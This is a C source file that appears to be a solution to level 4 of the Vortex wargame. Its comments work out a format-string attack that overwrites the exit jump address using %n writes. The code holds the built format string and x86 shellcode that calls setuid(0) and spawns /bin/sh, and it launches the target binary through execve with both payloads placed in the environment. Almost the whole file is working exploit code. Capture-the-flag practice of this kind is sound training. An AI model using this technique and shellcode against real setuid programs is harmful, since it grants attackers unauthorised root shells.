#include <unistd.h>

// Notes
// Exit jump location to overwrite: 0x0804a014
//
// fstring memory location: 0xffffde8e
// fstring dummy/addr pair start location: 0xffffdf84
// second printf arg location: 0xffffdcf4

// shellcode address: 0xffffdfc8
// %n garbage:
//   assume we get the first byte correct because it seems hella random
//   offset1 = 0xdf - 0xc9 = 22
//   offset2 = 0xff - 0xdf = 32
//   offset3 = 0xff - 0xff = 0 (needs to be >11 so use 256)

// Format string: <stackpop><dummy/addr pairs><write-code>
// stackpop: %08x a bunch of times to move the printf's stack pointer to the start of <dummy/addr pairs
// dummy/addr pair: pairs of dummy numbers and addresses of the byte you want to write
//                  The dummy number corresponds to a %nu parameter in <write-code>, these are used to increase the number of total bytes written for when the %n are used in the write-code
//                  The addr number is the address you want to write to, each addr in the pair will be one byte more than the previous

int main() {
  char *format = "%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f____\x14\xa0\x04\x08____\x15\xa0\x04\x08____\x16\xa0\x04\x08____\x17\xa0\x04\x08\x35\x93\x04\x08%37u%n%23u%n%32u%n%256u%n||||";
  char *shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

  char *filename = "/vortex/vortex4";
  char *argv[] = {NULL};
  char *arge[] = {"a", "b", format, "c", shellcode, NULL};
  
  execve(filename, argv, arge);
  
  return 0;
}
